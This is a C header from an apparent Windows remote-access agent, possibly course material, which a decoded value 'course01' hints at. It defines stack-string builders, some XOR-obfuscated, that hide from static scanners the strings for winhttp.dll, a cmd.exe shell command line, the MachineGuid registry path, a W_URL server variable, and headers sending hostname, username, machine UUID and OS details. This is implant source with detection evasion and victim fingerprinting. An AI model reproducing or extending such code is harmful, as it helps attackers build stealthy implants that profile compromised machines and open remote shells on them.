#pragma once
#include "types.h"
#include "wintypes.h"
#include "protocol.h"

#define STRLEN_BYTES_WINHTTP 22
#define STACKSTR_KEY_HASH 0x4E
#define STACKSTR_KEY_GETW 0x7A

static inline VOID BuildWinHttpDllName(PWCHAR buf)
{
    *(volatile WCHAR *)&buf[0] = L'w'; // w
    *(volatile WCHAR *)&buf[1] = L'i'; // i
    *(volatile WCHAR *)&buf[2] = L'n'; // n
    *(volatile WCHAR *)&buf[3] = L'h'; // h
    *(volatile WCHAR *)&buf[4] = L't'; // t
    *(volatile WCHAR *)&buf[5] = L't'; // t
    *(volatile WCHAR *)&buf[6] = L'p'; // p
    *(volatile WCHAR *)&buf[7] = L'.'; // .
    *(volatile WCHAR *)&buf[8] = L'd'; // d
    *(volatile WCHAR *)&buf[9] = L'l'; // l
    *(volatile WCHAR *)&buf[10] = L'l'; // l
    *(volatile WCHAR *)&buf[11] = L'\0'; // null terminator
}

static inline VOID BuildUserAgent(PWCHAR buf)
{
    *(volatile WCHAR *)&buf[0] = L'm'; // M
    *(volatile WCHAR *)&buf[1] = L'i'; // i
    *(volatile WCHAR *)&buf[2] = L'n'; // n
    *(volatile WCHAR *)&buf[3] = L'i'; // i
    *(volatile WCHAR *)&buf[4] = L'm'; // m
    *(volatile WCHAR *)&buf[5] = L'a'; // a
    *(volatile WCHAR *)&buf[6] = L'l'; // l
    *(volatile WCHAR *)&buf[7] = L'_'; //_
    *(volatile WCHAR *)&buf[8] = L'a'; // a
    *(volatile WCHAR *)&buf[9] = L'g'; // g
    *(volatile WCHAR *)&buf[10] = L'e'; // e
    *(volatile WCHAR *)&buf[11] = L'n'; // n
    *(volatile WCHAR *)&buf[12] = L't'; // t
    *(volatile WCHAR *)&buf[13] = L'/'; // /
    *(volatile WCHAR *)&buf[14] = L'1'; // 1
    *(volatile WCHAR *)&buf[15] = L'.'; // .
    *(volatile WCHAR *)&buf[16] = L'0'; // 0
    *(volatile WCHAR *)&buf[17] = L'\0'; // null terminator
}



static inline VOID BuildShellCommandLine(PWCHAR buf)
{
    *(volatile WCHAR *)&buf[0] = L'c'; 
    *(volatile WCHAR *)&buf[1] = L'm'; 
    *(volatile WCHAR *)&buf[2] = L'd'; 
    *(volatile WCHAR *)&buf[3] = L'.'; 
    *(volatile WCHAR *)&buf[4] = L'e';
    *(volatile WCHAR *)&buf[5] = L'x';
    *(volatile WCHAR *)&buf[6] = L'e';
    *(volatile WCHAR *)&buf[7] = L' ';
    *(volatile WCHAR *)&buf[8] = L'/';
    *(volatile WCHAR *)&buf[9] = L'K';
    *(volatile WCHAR *)&buf[10] = L' '; 
    *(volatile WCHAR *)&buf[11] = L'c';
    *(volatile WCHAR *)&buf[12] = L'h';
    *(volatile WCHAR *)&buf[13] = L'c';
    *(volatile WCHAR *)&buf[14] = L'p';
    *(volatile WCHAR *)&buf[15] = L' ';
    *(volatile WCHAR *)&buf[16] = L'6';
    *(volatile WCHAR *)&buf[17] = L'5';
    *(volatile WCHAR *)&buf[18] = L'0';
    *(volatile WCHAR *)&buf[19] = L'0';
    *(volatile WCHAR *)&buf[20] = L'1';
    *(volatile WCHAR *)&buf[21] = L' ';
    *(volatile WCHAR *)&buf[22] = L'>';
    *(volatile WCHAR *)&buf[23] = L'n';
    *(volatile WCHAR *)&buf[24] = L'u';
    *(volatile WCHAR *)&buf[25] = L'l';
    *(volatile WCHAR *)&buf[26] = L'\0';
}


static inline VOID BuildMachineGuidRegistryPath(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] ='S';
    *(volatile CHAR *)&buf[1] = 'O';
    *(volatile CHAR *)&buf[2] = 'F';
    *(volatile CHAR *)&buf[3] = 'T';
    *(volatile CHAR *)&buf[4] = 'W';
    *(volatile CHAR *)&buf[5] = 'A';
    *(volatile CHAR *)&buf[6] = 'R';
    *(volatile CHAR *)&buf[7] = 'E';
    *(volatile CHAR *)&buf[8] = '\\';
    *(volatile CHAR *)&buf[9] = 'M';
    *(volatile CHAR *)&buf[10] = 'i';
    *(volatile CHAR *)&buf[11] = 'c';
    *(volatile CHAR *)&buf[12] = 'r';
    *(volatile CHAR *)&buf[13] = 'o';
    *(volatile CHAR *)&buf[14] = 's';
    *(volatile CHAR *)&buf[15] = 'o';
    *(volatile CHAR *)&buf[16] = 'f';
    *(volatile CHAR *)&buf[17] = 't';
    *(volatile CHAR *)&buf[18] = '\\';
    *(volatile CHAR *)&buf[19] = 'C';
    *(volatile CHAR *)&buf[20] = 'r';
    *(volatile CHAR *)&buf[21] = 'y';
    *(volatile CHAR *)&buf[22] = 'p';
    *(volatile CHAR *)&buf[23] = 't';
    *(volatile CHAR *)&buf[24] = 'o';
    *(volatile CHAR *)&buf[25] = 'g';
    *(volatile CHAR *)&buf[26] = 'r';
    *(volatile CHAR *)&buf[27] = 'a';
    *(volatile CHAR *)&buf[28] = 'p';
    *(volatile CHAR *)&buf[29] = 'h';
    *(volatile CHAR *)&buf[30] = 'y';
    *(volatile CHAR *)&buf[31] = 0;
}

static inline VOID BuildMachineGuidValueName(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'M';
    *(volatile CHAR *)&buf[1] = 'a';
    *(volatile CHAR *)&buf[2] = 'c';
    *(volatile CHAR *)&buf[3] = 'h';
    *(volatile CHAR *)&buf[4] = 'i';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 'e';
    *(volatile CHAR *)&buf[7] = 'G';
    *(volatile CHAR *)&buf[8] = 'u';
    *(volatile CHAR *)&buf[9] = 'i';
    *(volatile CHAR *)&buf[10] = 'd';
    *(volatile CHAR *)&buf[11] = 0;
}

static inline VOID BuildUrlEnvironmentVariableName(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'W'; // W
    *(volatile CHAR *)&buf[1] = '_'; // _
    *(volatile CHAR *)&buf[2] = 'U'; // U
    *(volatile CHAR *)&buf[3] = 'R'; // R
    *(volatile CHAR *)&buf[4] = 'L'; // L
    *(volatile CHAR *)&buf[5] = '\0'; // null terminator
}

static inline VOID BuildDefaultCommitHash(PCHAR buf)
{
    volatile UINT32 key = STACKSTR_KEY_HASH;
    *(volatile CHAR *)&buf[0] = (0x2Du ^ key);
    *(volatile CHAR *)&buf[1] = (0x21u ^ key);
    *(volatile CHAR *)&buf[2] = (0x3Bu ^ key);
    *(volatile CHAR *)&buf[3] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[4] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[5] = (0x2Bu ^ key);
    *(volatile CHAR *)&buf[6] = (0x7Eu ^ key);
    *(volatile CHAR *)&buf[7] = (0x7Fu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[8] = 0;
}

static inline VOID BuildApiVersionHeader(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'p';
    *(volatile CHAR *)&buf[4] = 'i';
    *(volatile CHAR *)&buf[5] = '-';
    *(volatile CHAR *)&buf[6] = 'V';
    *(volatile CHAR *)&buf[7] = 'e';
    *(volatile CHAR *)&buf[8] = 'r';
    *(volatile CHAR *)&buf[9] = 's';
    *(volatile CHAR *)&buf[10] = 'i';
    *(volatile CHAR *)&buf[11] = 'o';
    *(volatile CHAR *)&buf[12] = 'n';
    *(volatile CHAR *)&buf[13] = ':';
    *(volatile CHAR *)&buf[14] = ' ';
    *(volatile CHAR *)&buf[15] = '0' + AGENT_API_VERSION;
    *(volatile CHAR *)&buf[16] = '\r';
    *(volatile CHAR *)&buf[17] = '\n';
    *(volatile CHAR *)&buf[18] = 0;
}



static inline VOID BuildAgentNameIdHeader(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'C';
    *(volatile CHAR *)&buf[3] = 'l';
    *(volatile CHAR *)&buf[4] = 'i';
    *(volatile CHAR *)&buf[5] = 'e';
    *(volatile CHAR *)&buf[6] = 'n';
    *(volatile CHAR *)&buf[7] = 't';
    *(volatile CHAR *)&buf[8] = '-';
    *(volatile CHAR *)&buf[9] = 'I';
    *(volatile CHAR *)&buf[10] = 'd';
    *(volatile CHAR *)&buf[11] = ':';
    *(volatile CHAR *)&buf[12] = ' ';
    *(volatile CHAR *)&buf[13] = '0' + AGENT_NAME_ID;
    *(volatile CHAR *)&buf[14] = '\r';
    *(volatile CHAR *)&buf[15] = '\n';
    *(volatile CHAR *)&buf[16] = 0;
}

static inline VOID BuildPlatformHeader(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'P';
    *(volatile CHAR *)&buf[3] = 'l';
    *(volatile CHAR *)&buf[4] = 'a';
    *(volatile CHAR *)&buf[5] = 't';
    *(volatile CHAR *)&buf[6] = 'f';
    *(volatile CHAR *)&buf[7] = 'o';
    *(volatile CHAR *)&buf[8] = 'r';
    *(volatile CHAR *)&buf[9] = 'm';
    *(volatile CHAR *)&buf[10] = ':';
    *(volatile CHAR *)&buf[11] = ' ';
    *(volatile CHAR *)&buf[12] = 'w';
    *(volatile CHAR *)&buf[13] = 'i';
    *(volatile CHAR *)&buf[14] = 'n';
    *(volatile CHAR *)&buf[15] = 'd';
    *(volatile CHAR *)&buf[16] = 'o';
    *(volatile CHAR *)&buf[17] = 'w';
    *(volatile CHAR *)&buf[18] = 's';
    *(volatile CHAR *)&buf[19] = '\r';
    *(volatile CHAR *)&buf[20] = '\n';
    *(volatile CHAR *)&buf[21] = 0;
}


static inline VOID BuildClientFeaturesHeaderPrefix(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'C';
    *(volatile CHAR *)&buf[3] = 'l';
    *(volatile CHAR *)&buf[4] = 'i';
    *(volatile CHAR *)&buf[5] = 'e';
    *(volatile CHAR *)&buf[6] = 'n';
    *(volatile CHAR *)&buf[7] = 't';
    *(volatile CHAR *)&buf[8] = '-';
    *(volatile CHAR *)&buf[9] = 'F';
    *(volatile CHAR *)&buf[10] = 'e';
    *(volatile CHAR *)&buf[11] = 'a';
    *(volatile CHAR *)&buf[12] = 't';
    *(volatile CHAR *)&buf[13] = 'u';
    *(volatile CHAR *)&buf[14] = 'r';
    *(volatile CHAR *)&buf[15] = 'e';
    *(volatile CHAR *)&buf[16] = 's';
    *(volatile CHAR *)&buf[17] = ':';
    *(volatile CHAR *)&buf[18] = ' ';
    *(volatile CHAR *)&buf[19] = 0;
}

//"X-Agent-Machine-Uuid: "
static inline VOID BuildMachineUuidHeaderPrefix(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'M';
    *(volatile CHAR *)&buf[9] = 'a';
    *(volatile CHAR *)&buf[10] = 'c';
    *(volatile CHAR *)&buf[11] = 'h';
    *(volatile CHAR *)&buf[12] = 'i';
    *(volatile CHAR *)&buf[13] = 'n';
    *(volatile CHAR *)&buf[14] = 'e';
    *(volatile CHAR *)&buf[15] = '-';
    *(volatile CHAR *)&buf[16] = 'U';
    *(volatile CHAR *)&buf[17] = 'u';
    *(volatile CHAR *)&buf[18] = 'i';
    *(volatile CHAR *)&buf[19] = 'd';
    *(volatile CHAR *)&buf[20] = ':';
    *(volatile CHAR *)&buf[21] = ' ';
    *(volatile CHAR *)&buf[22] = 0;
}

static inline VOID BuildHostnameHeaderPrefix(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'H';
    *(volatile CHAR *)&buf[9] = 'o';
    *(volatile CHAR *)&buf[10] = 's';
    *(volatile CHAR *)&buf[11] = 't';
    *(volatile CHAR *)&buf[12] = 'n';
    *(volatile CHAR *)&buf[13] = 'a';
    *(volatile CHAR *)&buf[14] = 'm';
    *(volatile CHAR *)&buf[15] = 'e';
    *(volatile CHAR *)&buf[16] = ':';
    *(volatile CHAR *)&buf[17] = ' ';
    *(volatile CHAR *)&buf[18] = 0;
}

static inline VOID BuildUsernameHeaderPrefix(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'A';
    *(volatile CHAR *)&buf[3] = 'g';
    *(volatile CHAR *)&buf[4] = 'e';
    *(volatile CHAR *)&buf[5] = 'n';
    *(volatile CHAR *)&buf[6] = 't';
    *(volatile CHAR *)&buf[7] = '-';
    *(volatile CHAR *)&buf[8] = 'U';
    *(volatile CHAR *)&buf[9] = 's';
    *(volatile CHAR *)&buf[10] = 'e';
    *(volatile CHAR *)&buf[11] = 'r';
    *(volatile CHAR *)&buf[12] = 'n';
    *(volatile CHAR *)&buf[13] = 'a';
    *(volatile CHAR *)&buf[14] = 'm';
    *(volatile CHAR *)&buf[15] = 'e';
    *(volatile CHAR *)&buf[16] = ':';
    *(volatile CHAR *)&buf[17] = ' ';
    *(volatile CHAR *)&buf[18] = 0;
}

static inline VOID BuildOsVersionHeaderPrefix(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'O';
    *(volatile CHAR *)&buf[3] = 'S';
    *(volatile CHAR *)&buf[4] = '-';
    *(volatile CHAR *)&buf[5] = 'V';
    *(volatile CHAR *)&buf[6] = 'e';
    *(volatile CHAR *)&buf[7] = 'r';
    *(volatile CHAR *)&buf[8] = 's';
    *(volatile CHAR *)&buf[9] = 'i';
    *(volatile CHAR *)&buf[10] = 'o';
    *(volatile CHAR *)&buf[11] = 'n';
    *(volatile CHAR *)&buf[12] = ':';
    *(volatile CHAR *)&buf[13] = ' ';
    *(volatile CHAR *)&buf[14] = 0;
}

// "X-OS-Build: ""
static inline VOID BuildOsBuildHeaderPrefix(PCHAR buf)
{
    *(volatile CHAR *)&buf[0] = 'X';
    *(volatile CHAR *)&buf[1] = '-';
    *(volatile CHAR *)&buf[2] = 'O';
    *(volatile CHAR *)&buf[3] = 'S';
    *(volatile CHAR *)&buf[4] = '-';
    *(volatile CHAR *)&buf[5] = 'B';
    *(volatile CHAR *)&buf[6] = 'u';
    *(volatile CHAR *)&buf[7] = 'i';
    *(volatile CHAR *)&buf[8] = 'l';
    *(volatile CHAR *)&buf[9] = 'd';
    *(volatile CHAR *)&buf[10] = ':';
    *(volatile CHAR *)&buf[11] = ' ';
    *(volatile CHAR *)&buf[12] = 0;
}

static inline VOID BuildCommitHeaderPrefix(PCHAR buf)
{
    volatile UINT32 key = 0x5B;
    *(volatile CHAR *)&buf[0] = (0x03u ^ key);
    *(volatile CHAR *)&buf[1] = (0x76u ^ key);
    *(volatile CHAR *)&buf[2] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[3] = (0x3Cu ^ key);
    *(volatile CHAR *)&buf[4] = (0x3Eu ^ key);
    *(volatile CHAR *)&buf[5] = (0x35u ^ key);
    *(volatile CHAR *)&buf[6] = (0x2Fu ^ key);
    *(volatile CHAR *)&buf[7] = (0x76u ^ key);
    *(volatile CHAR *)&buf[8] = (0x18u ^ key);
    *(volatile CHAR *)&buf[9] = (0x34u ^ key);
    *(volatile CHAR *)&buf[10] = (0x36u ^ key);
    *(volatile CHAR *)&buf[11] = (0x36u ^ key);
    *(volatile CHAR *)&buf[12] = (0x32u ^ key);
    *(volatile CHAR *)&buf[13] = (0x2Fu ^ key);
    *(volatile CHAR *)&buf[14] = (0x61u ^ key);
    *(volatile CHAR *)&buf[15] = (0x7Bu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[16] = 0;
}

static inline VOID BuildX64ArchitectureHeaders(PCHAR buf)
{
    volatile UINT32 key = 0x24;
    *(volatile CHAR *)&buf[0] = (0x7Cu ^ key);
    *(volatile CHAR *)&buf[1] = (0x09u ^ key);
    *(volatile CHAR *)&buf[2] = (0x65u ^ key);
    *(volatile CHAR *)&buf[3] = (0x43u ^ key);
    *(volatile CHAR *)&buf[4] = (0x41u ^ key);
    *(volatile CHAR *)&buf[5] = (0x4Au ^ key);
    *(volatile CHAR *)&buf[6] = (0x50u ^ key);
    *(volatile CHAR *)&buf[7] = (0x09u ^ key);
    *(volatile CHAR *)&buf[8] = (0x65u ^ key);
    *(volatile CHAR *)&buf[9] = (0x56u ^ key);
    *(volatile CHAR *)&buf[10] = (0x47u ^ key);
    *(volatile CHAR *)&buf[11] = (0x4Cu ^ key);
    *(volatile CHAR *)&buf[12] = (0x1Eu ^ key);
    *(volatile CHAR *)&buf[13] = (0x04u ^ key);
    *(volatile CHAR *)&buf[14] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[15] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[16] = (0x12u ^ key);
    *(volatile CHAR *)&buf[17] = (0x7Bu ^ key);
    *(volatile CHAR *)&buf[18] = (0x12u ^ key);
    *(volatile CHAR *)&buf[19] = (0x10u ^ key);
    *(volatile CHAR *)&buf[20] = (0x29u ^ key);
    *(volatile CHAR *)&buf[21] = (0x2Eu ^ key);
    *(volatile CHAR *)&buf[22] = (0x7Cu ^ key);
    *(volatile CHAR *)&buf[23] = (0x09u ^ key);
    *(volatile CHAR *)&buf[24] = (0x65u ^ key);
    *(volatile CHAR *)&buf[25] = (0x43u ^ key);
    *(volatile CHAR *)&buf[26] = (0x41u ^ key);
    *(volatile CHAR *)&buf[27] = (0x4Au ^ key);
    *(volatile CHAR *)&buf[28] = (0x50u ^ key);
    *(volatile CHAR *)&buf[29] = (0x09u ^ key);
    *(volatile CHAR *)&buf[30] = (0x74u ^ key);
    *(volatile CHAR *)&buf[31] = (0x56u ^ key);
    *(volatile CHAR *)&buf[32] = (0x4Bu ^ key);
    *(volatile CHAR *)&buf[33] = (0x47u ^ key);
    *(volatile CHAR *)&buf[34] = (0x41u ^ key);
    *(volatile CHAR *)&buf[35] = (0x57u ^ key);
    *(volatile CHAR *)&buf[36] = (0x57u ^ key);
    *(volatile CHAR *)&buf[37] = (0x09u ^ key);
    *(volatile CHAR *)&buf[38] = (0x65u ^ key);
    *(volatile CHAR *)&buf[39] = (0x56u ^ key);
    *(volatile CHAR *)&buf[40] = (0x47u ^ key);
    *(volatile CHAR *)&buf[41] = (0x4Cu ^ key);
    *(volatile CHAR *)&buf[42] = (0x1Eu ^ key);
    *(volatile CHAR *)&buf[43] = (0x04u ^ key);
    *(volatile CHAR *)&buf[44] = (0x5Cu ^ key);
    *(volatile CHAR *)&buf[45] = (0x1Cu ^ key);
    *(volatile CHAR *)&buf[46] = (0x12u ^ key);
    *(volatile CHAR *)&buf[47] = (0x7Bu ^ key);
    *(volatile CHAR *)&buf[48] = (0x12u ^ key);
    *(volatile CHAR *)&buf[49] = (0x10u ^ key);
    *(volatile CHAR *)&buf[50] = (0x29u ^ key);
    *(volatile CHAR *)&buf[51] = (0x2Eu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[52] = 0;
}

static inline VOID BuildI386ArchitectureHeaders(PCHAR buf)
{
    volatile UINT32 key = 0x37;
    *(volatile CHAR *)&buf[0] = (0x6Fu ^ key);
    *(volatile CHAR *)&buf[1] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[2] = (0x76u ^ key);
    *(volatile CHAR *)&buf[3] = (0x50u ^ key);
    *(volatile CHAR *)&buf[4] = (0x52u ^ key);
    *(volatile CHAR *)&buf[5] = (0x59u ^ key);
    *(volatile CHAR *)&buf[6] = (0x43u ^ key);
    *(volatile CHAR *)&buf[7] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[8] = (0x76u ^ key);
    *(volatile CHAR *)&buf[9] = (0x45u ^ key);
    *(volatile CHAR *)&buf[10] = (0x54u ^ key);
    *(volatile CHAR *)&buf[11] = (0x5Fu ^ key);
    *(volatile CHAR *)&buf[12] = (0x0Du ^ key);
    *(volatile CHAR *)&buf[13] = (0x17u ^ key);
    *(volatile CHAR *)&buf[14] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[15] = (0x04u ^ key);
    *(volatile CHAR *)&buf[16] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[17] = (0x01u ^ key);
    *(volatile CHAR *)&buf[18] = (0x3Au ^ key);
    *(volatile CHAR *)&buf[19] = (0x3Du ^ key);
    *(volatile CHAR *)&buf[20] = (0x6Fu ^ key);
    *(volatile CHAR *)&buf[21] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[22] = (0x76u ^ key);
    *(volatile CHAR *)&buf[23] = (0x50u ^ key);
    *(volatile CHAR *)&buf[24] = (0x52u ^ key);
    *(volatile CHAR *)&buf[25] = (0x59u ^ key);
    *(volatile CHAR *)&buf[26] = (0x43u ^ key);
    *(volatile CHAR *)&buf[27] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[28] = (0x67u ^ key);
    *(volatile CHAR *)&buf[29] = (0x45u ^ key);
    *(volatile CHAR *)&buf[30] = (0x58u ^ key);
    *(volatile CHAR *)&buf[31] = (0x54u ^ key);
    *(volatile CHAR *)&buf[32] = (0x52u ^ key);
    *(volatile CHAR *)&buf[33] = (0x44u ^ key);
    *(volatile CHAR *)&buf[34] = (0x44u ^ key);
    *(volatile CHAR *)&buf[35] = (0x1Au ^ key);
    *(volatile CHAR *)&buf[36] = (0x76u ^ key);
    *(volatile CHAR *)&buf[37] = (0x45u ^ key);
    *(volatile CHAR *)&buf[38] = (0x54u ^ key);
    *(volatile CHAR *)&buf[39] = (0x5Fu ^ key);
    *(volatile CHAR *)&buf[40] = (0x0Du ^ key);
    *(volatile CHAR *)&buf[41] = (0x17u ^ key);
    *(volatile CHAR *)&buf[42] = (0x5Eu ^ key);
    *(volatile CHAR *)&buf[43] = (0x04u ^ key);
    *(volatile CHAR *)&buf[44] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[45] = (0x01u ^ key);
    *(volatile CHAR *)&buf[46] = (0x3Au ^ key);
    *(volatile CHAR *)&buf[47] = (0x3Du ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[48] = 0;
}

static inline VOID BuildArm64ArchitectureHeaders(PCHAR buf)
{
    volatile UINT32 key = 0x35;
    *(volatile CHAR *)&buf[0] = (0x6Du ^ key);
    *(volatile CHAR *)&buf[1] = (0x18u ^ key);
    *(volatile CHAR *)&buf[2] = (0x74u ^ key);
    *(volatile CHAR *)&buf[3] = (0x52u ^ key);
    *(volatile CHAR *)&buf[4] = (0x50u ^ key);
    *(volatile CHAR *)&buf[5] = (0x5Bu ^ key);
    *(volatile CHAR *)&buf[6] = (0x41u ^ key);
    *(volatile CHAR *)&buf[7] = (0x18u ^ key);
    *(volatile CHAR *)&buf[8] = (0x74u ^ key);
    *(volatile CHAR *)&buf[9] = (0x47u ^ key);
    *(volatile CHAR *)&buf[10] = (0x56u ^ key);
    *(volatile CHAR *)&buf[11] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[12] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[13] = (0x15u ^ key);
    *(volatile CHAR *)&buf[14] = (0x54u ^ key);
    *(volatile CHAR *)&buf[15] = (0x54u ^ key);
    *(volatile CHAR *)&buf[16] = (0x47u ^ key);
    *(volatile CHAR *)&buf[17] = (0x56u ^ key);
    *(volatile CHAR *)&buf[18] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[19] = (0x03u ^ key);
    *(volatile CHAR *)&buf[20] = (0x01u ^ key);
    *(volatile CHAR *)&buf[21] = (0x38u ^ key);
    *(volatile CHAR *)&buf[22] = (0x3Fu ^ key);
    *(volatile CHAR *)&buf[23] = (0x6Du ^ key);
    *(volatile CHAR *)&buf[24] = (0x18u ^ key);
    *(volatile CHAR *)&buf[25] = (0x74u ^ key);
    *(volatile CHAR *)&buf[26] = (0x52u ^ key);
    *(volatile CHAR *)&buf[27] = (0x50u ^ key);
    *(volatile CHAR *)&buf[28] = (0x5Bu ^ key);
    *(volatile CHAR *)&buf[29] = (0x41u ^ key);
    *(volatile CHAR *)&buf[30] = (0x18u ^ key);
    *(volatile CHAR *)&buf[31] = (0x65u ^ key);
    *(volatile CHAR *)&buf[32] = (0x47u ^ key);
    *(volatile CHAR *)&buf[33] = (0x5Au ^ key);
    *(volatile CHAR *)&buf[34] = (0x56u ^ key);
    *(volatile CHAR *)&buf[35] = (0x50u ^ key);
    *(volatile CHAR *)&buf[36] = (0x46u ^ key);
    *(volatile CHAR *)&buf[37] = (0x46u ^ key);
    *(volatile CHAR *)&buf[38] = (0x18u ^ key);
    *(volatile CHAR *)&buf[39] = (0x74u ^ key);
    *(volatile CHAR *)&buf[40] = (0x47u ^ key);
    *(volatile CHAR *)&buf[41] = (0x56u ^ key);
    *(volatile CHAR *)&buf[42] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[43] = (0x0Fu ^ key);
    *(volatile CHAR *)&buf[44] = (0x54u ^ key);
    *(volatile CHAR *)&buf[45] = (0x54u ^ key);
    *(volatile CHAR *)&buf[46] = (0x47u ^ key);
    *(volatile CHAR *)&buf[47] = (0x56u ^ key);
    *(volatile CHAR *)&buf[48] = (0x5Du ^ key);
    *(volatile CHAR *)&buf[49] = (0x03u ^ key);
    *(volatile CHAR *)&buf[50] = (0x01u ^ key);
    *(volatile CHAR *)&buf[51] = (0x38u ^ key);
    *(volatile CHAR *)&buf[52] = (0x3Fu ^ key);
    *(volatile CHAR *)&*(volatile WCHAR *)&buf[53] = 0;
}